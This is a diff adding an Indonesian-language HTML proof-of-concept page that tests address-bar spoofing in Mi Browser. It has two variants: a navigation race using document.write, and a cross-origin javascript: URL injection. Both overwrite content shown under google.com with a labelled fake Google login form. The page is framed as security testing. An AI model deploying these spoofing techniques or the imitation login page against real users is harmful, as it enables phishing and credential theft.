@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="id">
+<head><style>
+@font-face {
+  font-family: "Optimistic";
+  font-style: normal;
+  font-weight: 400 600;
+  font-display: swap;
+  src: url("/fonts/OptimisticAI_VF_Optimized.woff2") format("woff2");
+}
+@font-face {
+  font-family: "Optimistic Mono";
+  font-style: normal;
+  font-weight: 400;
+  font-display: swap;
+  src: url("/fonts/OptimisticMono_W_TextRegular.woff2") format("woff2");
+}
+:where(html) {
+  font-family: "Optimistic", system-ui, sans-serif;
+}
+:where(code, pre, kbd, samp) {
+  font-family: "Optimistic Mono", ui-monospace, monospace;
+}
+</style>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>PoC - Address Bar Spoofing</title>
+<style>
+  body{font-family:sans-serif;padding:20px;margin:0;background:#fff;}
+  .note{background:#e7f3ff;border:1px solid #2196F3;padding:10px;margin:12px 0;border-radius:6px;}
+  .warn{background:#fff3cd;border:1px solid #ffc107;padding:10px;margin:12px 0;border-radius:6px;}
+  button{font-size:16px;padding:14px 20px;margin:8px 4px;border-radius:8px;border:1px solid #999;background:#f5f5f5;}
+  button:active{background:#ddd;}
+  h2{margin-top:28px;}
+  code{background:#eee;padding:2px 6px;}
+</style>
+</head>
+<body>
+
+<h1>PoC: Address Bar Spoofing</h1>
+<div class="note"><b>Tujuan:</b> membuktikan address bar bisa menampilkan URL
+(<code>google.com</code>) yang <b>tidak sesuai</b> dengan konten halaman
+milik attacker. Buka file ini di <b>Mi Browser</b>, lalu coba tiap varian.
+Bandingkan dengan Chrome.</div>
+
+<div class="warn"><b>HANYA untuk pengujian keamanan.</b> Konten palsu di bawah
+sengaja diberi label jelas agar tidak disalahgunakan.</div>
+
+<!-- ============ VARIAN A: NAVIGATION RACE ============ -->
+<h2>Varian A — Navigation Race</h2>
+<div class="note">Cara kerja: halaman mulai navigasi ke <code>google.com</code>
+lalu — sebelum navigasi selesai — menimpa dokumen dengan konten palsu.
+Kalau browser mengupdate address bar lebih dulu, hasilnya: address bar =
+google.com, konten = milik attacker.</div>
+
+<button onclick="race(500)">Coba delay 0.5 dtk</button>
+<button onclick="race(1500)">Coba delay 1.5 dtk</button>
+<button onclick="race(3000)">Coba delay 3 dtk</button>
+
+<div class="warn"><b>Catat:</b> setelah klik, perhatikan address bar.
+<b>Sukses = address bar tetap/tertulis google.com TAPI kontennya halaman
+palsu di bawah</b> (ada banner merah "HALAMAN PALSU"). Screenshot keduanya.</div>
+
+<!-- ============ VARIAN B: JAVASCRIPT URL CROSS-ORIGIN ============ -->
+<h2>Varian B — javascript: URL lintas origin</h2>
+<div class="note">Cara kerja: buka <code>google.com</code> di tab baru, lalu
+coba jalankan <code>javascript:</code> URL ke tab tersebut. Browser yang
+benar harus memblokirnya. Kalau konten google.com keganti, itu bug serius.</div>
+
+<button onclick="jsurl()">Jalankan Varian B</button>
+<div class="warn"><b>Catat:</b> tab google.com kebuka? Kontennya berubah jadi
+halaman palsu atau tetap google.com asli? Screenshot hasilnya.</div>
+
+<script>
+// ---------- Konten palsu (disuntikkan ke halaman target) ----------
+var FAKE = '<html><head><meta name=viewport content="width=device-width,initial-scale=1">'
++ '<title>Google</title></head>'
++ '<body style="font-family:sans-serif;text-align:center;padding-top:60px;margin:0">'
++ '<div style="background:#d32f2f;color:#fff;padding:12px;font-weight:bold">'
++ 'HALAMAN PALSU — PoC Address Bar Spoofing (pengujian keamanan)</div>'
++ '<div style="font-size:48px;margin:30px 0">'
++ '<b style="color:#4285F4">G</b><b style="color:#EA4335">o</b>'
++ '<b style="color:#FBBC05">o</b><b style="color:#4285F4">g</b>'
++ '<b style="color:#34A853">l</b><b style="color:#EA4335">e</b></div>'
++ '<p>Login untuk melanjutkan</p>'
++ '<input placeholder="Email" style="padding:10px;width:80%;margin:5px"><br>'
++ '<input type="password" placeholder="Sandi" style="padding:10px;width:80%;margin:5px"><br>'
++ '<p style="color:#888;font-size:12px">Ini konten milik attacker. '
++ 'Jika address bar menulis google.com, spoofing BERHASIL.</p>'
++ '</body></html>';
+
+// ---------- Varian A ----------
+function race(delayMs){
+  // 1. Mulai navigasi ke situs asli
+  window.location = 'https://www.google.com/';
+  // 2. Timer: timpa dokumen sebelum navigasi commit (race condition)
+  setTimeout(function(){
+    try {
+      document.open();
+      document.write(FAKE);
+      document.close();
+    } catch(e){ /* navigasi sudah commit, race gagal */ }
+  }, delayMs);
+}
+
+// ---------- Varian B ----------
+function jsurl(){
+  var w = window.open('https://www.google.com/', '_blank');
+  setTimeout(function(){
+    try {
+      // Coba eksekusi javascript: URL di konteks tab google.com
+      w.location = 'javascript:document.open();document.write(\'' +
+        FAKE.replace(/'/g, "\\'") + '\');document.close();void 0;';
+    } catch(e){ /* diblokir = perilaku benar */ }
+    alert('Cek tab google.com sekarang.\n\n'
+      + 'Konten berubah jadi HALAMAN PALSU = VULNERABLE.\n'
+      + 'Konten tetap google.com asli / tab diblokir = AMAN.');
+  }, 2500);
+}
+</script>
+<script>(function(){var loc=location.href.replace(/#.*$/,"");var ATTR_NAMES=["data-product-id","data-productid","data-product_id","product-id","productid","product_id","data-source-entity-id","source-entity-id","source_entity_id","data-product","data-metadata","data-meta"];var DATASET_KEYS=["productId","productid","product_id","sourceEntityId","sourceentityid","source_entity_id","product","metadata","meta"];function readProductId(value){if(typeof value!=="string"||value.length===0)return null;if(/^[0-9]{6,}$/.test(value))return value;var match=value.match(/(?:product(?:_|-)?id|source(?:_|-)?entity(?:_|-)?id)["'=:\s]+([0-9]{6,})/i);return match?match[1]:null}function extractProductId(start){for(var node=start;node&&node!==document.body;node=node.parentElement){for(var i=0;i<ATTR_NAMES.length;i++){var attrValue=node.getAttribute&&node.getAttribute(ATTR_NAMES[i]);var attrProductId=readProductId(attrValue);if(attrProductId)return attrProductId}var dataset=node.dataset||null;if(dataset){for(var j=0;j<DATASET_KEYS.length;j++){var dataValue=dataset[DATASET_KEYS[j]];var dataProductId=readProductId(dataValue);if(dataProductId)return dataProductId}}}return null}function isInlineMediaSlotElement(node){return !!(node&&node.getAttribute&&node.getAttribute("data-clippy-inline-media-slot")!==null)}function findInlineMediaSlot(start){for(var node=start;node&&node!==document.body;node=node.parentElement){if(isInlineMediaSlotElement(node))return node}return null}function readInlineMediaUrl(node){if(!node)return null;return node.getAttribute&&((node.getAttribute("data-clippy-inline-media-url")||node.getAttribute("data-url")||node.getAttribute("data_url")))||node.href||null}function stripHash(url){return String(url).replace(/#.*$/,"")}function urlsMatch(a,b){if(!a||!b)return false;try{return stripHash(new URL(a,loc).href)===stripHash(new URL(b,loc).href)}catch(_){return stripHash(a)===stripHash(b)}}function isFirstPartyReelUrl(value){try{var url=new URL(value,loc);if(url.protocol!=="https:")return false;var host=url.hostname.toLowerCase();var supported=host==="instagram.com"||host.endsWith(".instagram.com")||host==="facebook.com"||host.endsWith(".facebook.com");return supported&&/\/reels?\//i.test(url.pathname)}catch(_){return false}}function isInlineMediaUrlClick(node,href){var slot=findInlineMediaSlot(node);if(!slot)return false;var slotUrl=readInlineMediaUrl(slot);if(slotUrl)return urlsMatch(href,slotUrl);return isFirstPartyReelUrl(href)}function findDataHref(start){for(var node=start;node&&node!==document.body;node=node.parentElement){if(node.getAttribute){var href=node.getAttribute("data-href")||node.getAttribute("data-url");if(href)return{href:href,node:node}}}return null}var nativeOpen=window.open;window.open=function(url){if(parent!==window&&typeof url==="string"&&/^https?:\/\//.test(url)){parent.postMessage({type:"ecto:usercontent-link-click",href:url},"*");return null}return nativeOpen?nativeOpen.apply(window,arguments):null};document.addEventListener("click",function(e){var target=e.target instanceof Element?e.target:null;if(!target)return;if(parent===window)return;var a=target.closest?target.closest("a[href]"):null;if(a&&a.href&&/^https?:\/\//.test(a.href)&&a.href.replace(/#.*$/,"")!==loc){if(isInlineMediaUrlClick(a,a.href))return;var productId=extractProductId(target)||extractProductId(a);if(productId){e.preventDefault();parent.postMessage({type:"ecto-artifact-link-click",productId:productId},"*");return}e.preventDefault();parent.postMessage({type:"ecto:usercontent-link-click",href:a.href},"*");return}var dataHref=findDataHref(target);if(dataHref&&/^https?:\/\//.test(dataHref.href)&&dataHref.href.replace(/#.*$/,"")!==loc){if(isInlineMediaUrlClick(dataHref.node,dataHref.href))return;e.preventDefault();parent.postMessage({type:"ecto:usercontent-link-click",href:dataHref.href},"*")}},true)})();</script><script>(function(){var FOCUS_TYPE="ecto:artifact-focus-request";var CLOSE_TYPE="ecto:artifact-close-request";function focusArtifactDocument(){var body=document.body;if(!body)return;try{window.focus();}catch(e){}if(!body.hasAttribute("tabindex"))body.setAttribute("tabindex","-1");try{body.focus({preventScroll:true});}catch(e){try{body.focus();}catch(e2){}}}window.addEventListener("message",function(event){if(event.source!==window.parent)return;var data=event.data;if(!data||typeof data!=="object"||data.type!==FOCUS_TYPE)return;if(document.readyState==="loading"){document.addEventListener("DOMContentLoaded",focusArtifactDocument,{once:true});return;}focusArtifactDocument();});window.addEventListener("keydown",function(event){if(event.key!=="Escape")return;window.setTimeout(function(){if(event.defaultPrevented)return;window.parent.postMessage({type:CLOSE_TYPE},"*");},0);});})();</script></body>
+</html>
